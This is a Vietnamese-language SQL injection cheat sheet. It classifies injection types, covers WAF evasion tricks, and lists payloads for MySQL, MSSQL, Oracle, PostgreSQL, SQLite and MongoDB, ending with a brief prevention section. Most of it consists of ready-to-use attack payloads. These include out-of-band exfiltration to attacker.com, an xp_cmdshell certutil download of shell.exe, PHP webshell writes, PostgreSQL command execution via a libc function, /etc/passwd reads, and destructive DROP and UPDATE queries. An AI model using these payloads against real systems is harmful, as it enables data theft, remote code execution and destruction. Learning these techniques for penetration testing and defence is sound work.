# Phân Loại SQL Injection — Toàn Diện

> Bao gồm các kỹ thuật cơ bản, nâng cao, evasion, và payload theo từng database.

---

## 1. Phân Loại Theo Cơ Chế Phản Hồi

### 1.1 In-band SQLi
Kết quả trả về ngay trên cùng kênh HTTP.

#### 1.1.1 Error-based
Khai thác thông báo lỗi của DB để lộ thông tin.

```sql
-- MySQL
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND updatexml(1, CONCAT(0x7e,(SELECT database())),1) --

-- MSSQL
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --

-- Oracle
' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) --

-- PostgreSQL
' AND 1=cast((SELECT version()) as int) --
```

#### 1.1.2 Union-based
Ghép thêm SELECT để lấy dữ liệu từ bảng khác.

```sql
-- Tìm số cột trước
' ORDER BY 1--
' ORDER BY 2--

-- Khai thác
' UNION SELECT null, username, password FROM users --
' UNION SELECT null, table_name, null FROM information_schema.tables --
```

---

### 1.2 Blind SQLi
Không thấy kết quả trực tiếp, phải suy luận qua hành vi.

#### 1.2.1 Boolean-based Blind
Gửi điều kiện True/False, quan sát sự thay đổi response.

```sql
-- True → trang bình thường
' AND 1=1 --

-- False → trang lỗi / trống
' AND 1=2 --

-- Trích xuất từng ký tự
' AND SUBSTRING((SELECT database()),1,1)='a' --
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97 --
```

#### 1.2.2 Time-based Blind
Không có sự khác biệt response, dùng delay để suy luận.

```sql
-- MySQL
' AND SLEEP(5) --
' AND IF(1=1, SLEEP(5), 0) --

-- MSSQL
'; WAITFOR DELAY '0:0:5' --
' IF (1=1) WAITFOR DELAY '0:0:5' --

-- Oracle
' AND 1=dbms_pipe.receive_message('a',5) --

-- PostgreSQL
' AND 1=(SELECT 1 FROM pg_sleep(5)) --

-- SQLite
' AND 1=(SELECT 1 WHERE randomblob(100000000) IS NOT NULL) --
```

#### 1.2.3 Heavy Query (không dùng sleep)
Gây tải CPU để tạo delay mà không cần hàm sleep.

```sql
-- MySQL
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) --

-- MSSQL
' AND (SELECT COUNT(*) FROM sys.columns A, sys.columns B, sys.columns C) > 0 --
```

---

### 1.3 Out-of-band (OOB) SQLi
Dữ liệu bị lấy ra qua kênh phụ — DNS hoặc HTTP request.

```sql
-- MySQL (DNS)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\a')) --

-- MSSQL (DNS + xp_cmdshell)
'; exec master..xp_dirtree '//attacker.com/a' --
'; exec master..xp_cmdshell 'nslookup attacker.com' --

-- Oracle (HTTP)
' UNION SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual --

-- PostgreSQL (DNS)
' COPY (SELECT '') TO PROGRAM 'nslookup attacker.com' --
```

---

## 2. Kỹ Thuật Đặc Biệt

### 2.1 Second-Order SQLi (Stored SQLi)
Payload được lưu vào DB trước, thực thi sau khi được đọc ra ở chỗ khác.

```
Bước 1: Đăng ký username = admin'--
Bước 2: App lưu vào DB (an toàn, dùng parameterized)
Bước 3: Chức năng "đổi mật khẩu" dùng username này trong query → injection
```

### 2.2 Stacked Queries
Thực thi nhiều câu lệnh SQL trong một request (chỉ hoạt động với một số driver/DB).

```sql
-- MSSQL / PostgreSQL
'; DROP TABLE users; --
'; INSERT INTO admin VALUES('hacker','1234'); --
'; EXEC xp_cmdshell('whoami'); --

-- MySQL (chỉ hoạt động với mysqli_multi_query)
'; UPDATE users SET password='hacked' WHERE 1=1; --
```

### 2.3 Lateral SQLi (Cross-table / Join Injection)
Khai thác JOIN để truy cập bảng không liên quan.

```sql
' UNION SELECT a.username, b.credit_card FROM users a JOIN payments b ON a.id=b.user_id --
```

### 2.4 XML/XPath Injection (kết hợp SQL)
Khi app dùng XML functions trong SQL.

```sql
-- SQL Server
' AND 1=(SELECT * FROM OPENXML(...))--

-- MySQL ExtractValue
' AND extractvalue(rand(), concat(0x3a, (SELECT user()))) --
```

### 2.5 JSON-based SQLi
Injection qua tham số dạng JSON gửi lên API.

```json
{"username": "admin'--", "password": "anything"}
{"id": "1 UNION SELECT username,password FROM users--"}
```

### 2.6 HTTP Header Injection
Payload trong header thay vì body/URL.

```
X-Forwarded-For: 127.0.0.1' OR 1=1--
User-Agent: ' OR 1=1--
Referer: ' UNION SELECT 1,2,3--
Cookie: session=abc' OR '1'='1
```

### 2.7 GraphQL SQLi
Khi backend của GraphQL dùng SQL thô.

```graphql
{ user(id: "1 UNION SELECT username,password FROM users--") { name } }
```

### 2.8 ORM SQLi
Dùng sai ORM dẫn đến SQL injection dù có framework.

```python
# Django - raw() không an toàn
User.objects.raw(f"SELECT * FROM users WHERE name='{name}'")

# SQLAlchemy - text() không parameterized
db.execute(text(f"SELECT * FROM users WHERE id={user_id}"))
```

---

## 3. Kỹ Thuật Evasion / Ẩn Mình

### 3.1 WAF Bypass — Encoding

```sql
-- URL encode
%27 OR %271%27=%271

-- Double URL encode
%2527 → %27 → '

-- Unicode encode
' → %u0027 hoặc %ef%bc%87

-- HTML entity (trong XML context)
' → &apos;
```

### 3.2 WAF Bypass — Case & Whitespace

```sql
-- Thay đổi case
SeLeCt UsErNaMe FrOm UsErS

-- Dùng comment thay space
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users    -- tab thay space
SELECT%0ausername%0aFROM%0ausers    -- newline thay space

-- Inline comment
SE/**/LECT * FR/**/OM users
```

### 3.3 WAF Bypass — Keyword Obfuscation

```sql
-- Tránh từ khóa SELECT
(SELECT 1)          → dùng trong subquery
SELEC%54           → T bị encode

-- Tránh UNION
UNiOn SeLEct
UN/**/ION SEL/**/ECT
UNION%20SELECT
/*!UNION*/ /*!SELECT*/    -- MySQL comment đặc biệt

-- Tránh OR / AND
|| thay OR (MySQL, Oracle)
&& thay AND (MySQL)
```

### 3.4 WAF Bypass — Type Juggling & Function Alternatives

```sql
-- Thay SLEEP
BENCHMARK(10000000,MD5(1))      -- MySQL
pg_sleep(5)                      -- PostgreSQL
WAITFOR DELAY '0:0:5'           -- MSSQL

-- Thay SUBSTRING
MID(), SUBSTR(), LEFT(), RIGHT()
REGEXP '^a'
LIKE 'a%'

-- Thay CONCAT
||                               -- Oracle, PostgreSQL
+                                -- MSSQL
CONCAT_WS(',',a,b)              -- MySQL
```

### 3.5 Chunked / Multipart Bypass
M��t số WAF không reassemble chunked request trước khi kiểm tra.

```
Transfer-Encoding: chunked

5\r\n
' OR \r\n
4\r\n
1=1\r\n
0\r\n
```

### 3.6 HPP — HTTP Parameter Pollution

```
GET /search?id=1&id=2 UNION SELECT ...
```

M��t số framework merge param, WAF chỉ check param đầu.

### 3.7 Scientific Notation / Numeric Tricks

```sql
-- Bypass numeric filter
1e0 UNION SELECT ...    -- 1e0 = 1.0, hợp lệ về numeric
0x61646d696e            -- hex cho 'admin'
```

### 3.8 Out-of-order / Asynchronous Injection
Payload được thực thi async hoặc trong background job, response không phản ánh ngay.

```sql
-- Trigger stored procedure chạy sau
'; EXEC sp_schedule_job 'DROP TABLE users' --
```

### 3.9 Polyglot Payload
M��t payload hoạt động trên nhiều DB cùng lúc.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### 3.10 Comment Tricks theo từng DB

```sql
-- MySQL
#, --, /*!...*/
/*!50000 SELECT*/    -- chỉ chạy nếu MySQL version >= 5.0000

-- MSSQL
--, /* */

-- Oracle
--

-- PostgreSQL
--, /* */

-- SQLite
--, /* */
```

---

## 4. Payload Theo Từng Database

### 4.1 MySQL / MariaDB

```sql
-- Fingerprint
' AND 1=1-- (True)
' AND version() LIKE '8%'--

-- Enum DB
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extract data
SELECT GROUP_CONCAT(username,':',password SEPARATOR '|') FROM users

-- File read/write
SELECT LOAD_FILE('/etc/passwd')
SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'

-- Privilege check
SELECT SUPER_PRIV FROM mysql.user WHERE user=current_user()
```

### 4.2 Microsoft SQL Server (MSSQL)

```sql
-- Fingerprint
' AND @@version LIKE '%Microsoft%'--

-- Enum
SELECT name FROM sys.databases
SELECT name FROM sys.tables
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users')

-- Extract
SELECT STRING_AGG(username+':'+password,',') FROM users

-- OS command
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'certutil -urlcache -f http://attacker.com/shell.exe C:\shell.exe'

-- Enable xp_cmdshell (nếu bị tắt)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- Linked server
SELECT * FROM OPENROWSET('SQLNCLI','server=attacker.com;uid=sa;pwd=pass;','SELECT 1')
```

### 4.3 Oracle

```sql
-- Fingerprint
' AND 1=(SELECT 1 FROM dual)--

-- Enum
SELECT owner FROM all_tables
SELECT table_name FROM all_tables WHERE owner='USERS'
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Extract
SELECT listagg(username||':'||password,',') WITHIN GROUP (ORDER BY 1) FROM users

-- OOB via HTTP
SELECT UTL_HTTP.request('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- File
SELECT * FROM utl_file.fopen('/etc','passwd','r') -- cần privilege
```

### 4.4 PostgreSQL

```sql
-- Fingerprint
' AND version() LIKE '%PostgreSQL%'--

-- Enum
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extract
SELECT string_agg(username||':'||password,',') FROM users

-- File read
SELECT pg_read_file('/etc/passwd')
COPY (SELECT '') TO PROGRAM 'cat /etc/passwd'

-- RCE
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT;
SELECT system('id');

-- Large object
SELECT lo_import('/etc/passwd');
SELECT lo_get(16384);
```

### 4.5 SQLite

```sql
-- Fingerprint
' AND sqlite_version() LIKE '3%'--

-- Enum
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='users'

-- Extract
SELECT group_concat(username||':'||password,'|') FROM users

-- Attach để đọc file khác
ATTACH DATABASE '/var/www/html/shell.php' AS hack;
CREATE TABLE hack.pwn (dataz text);
INSERT INTO hack.pwn VALUES('<?php system($_GET[c]);?>');
```

### 4.6 MongoDB (NoSQL Injection — bonus)
Không phải SQL nhưng concept tương tự, hay bị nhầm lẫn.

```json
-- Authentication bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}

-- Operator injection
?username[$gt]=&password[$gt]=
```

---

## 5. Theo Ngữ Cảnh Injection

| Ngữ cảnh | Ví dụ | Kỹ thuật |
|---|---|---|
| String (single quote) | `WHERE name='INPUT'` | `' OR '1'='1` |
| String (double quote) | `WHERE name="INPUT"` | `" OR "1"="1` |
| Numeric | `WHERE id=INPUT` | `1 OR 1=1` |
| LIKE clause | `WHERE name LIKE '%INPUT%'` | `%' OR 1=1--` |
| ORDER BY | `ORDER BY INPUT` | `1,SLEEP(5)` |
| IN clause | `WHERE id IN (INPUT)` | `1) OR 1=1--` |
| Subquery | `WHERE id=(INPUT)` | `1 UNION SELECT...` |
| INSERT | `INSERT INTO t VALUES ('INPUT')` | `',''); DROP TABLE t--` |
| UPDATE | `SET col='INPUT'` | `x' WHERE 1=1--` |

---

## 6. Mục Tiêu Khai Thác

| Mục tiêu | Kỹ thuật | Điều kiện |
|---|---|---|
| Authentication bypass | `' OR 1=1--` | Login form |
| Data dump | UNION / Boolean blind | SELECT query |
| File read | LOAD_FILE, pg_read_file | FILE privilege |
| File write / webshell | INTO OUTFILE, COPY TO | Write permission |
| RCE | xp_cmdshell, UDF, COPY TO PROGRAM | Admin privilege |
| Privilege escalation | Đọc credential từ DB | Data access |
| Pivot / Linked server | OPENROWSET, dblink | Network access |
| DoS | Heavy query, DROP | Stacked queries |

---

## 7. Tools Tự Động

| Tool | Mục đích |
|---|---|
| sqlmap | Auto detect & exploit SQLi |
| ghauri | SQLi detection nhanh hơn sqlmap |
| BBQSQL | Blind SQLi framework |
| SQLNinja | MSSQL-focused exploitation |
| NoSQLMap | NoSQL injection |
| Havij | GUI-based (cũ, ít dùng) |

---

## 8. Phòng Chống (Reference)

```python
# Parameterized query (đúng)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ORM đúng cách
User.objects.filter(id=user_id)

# Stored procedure đúng
EXEC sp_getUser @id = @input
```

- Dùng **Prepared Statements / Parameterized Queries**
- Validate & whitelist input
- Principle of Least Privilege cho DB user
- WAF làm lớp bổ sung, không phải giải pháp duy nhất
- Error messages không lộ thông tin DB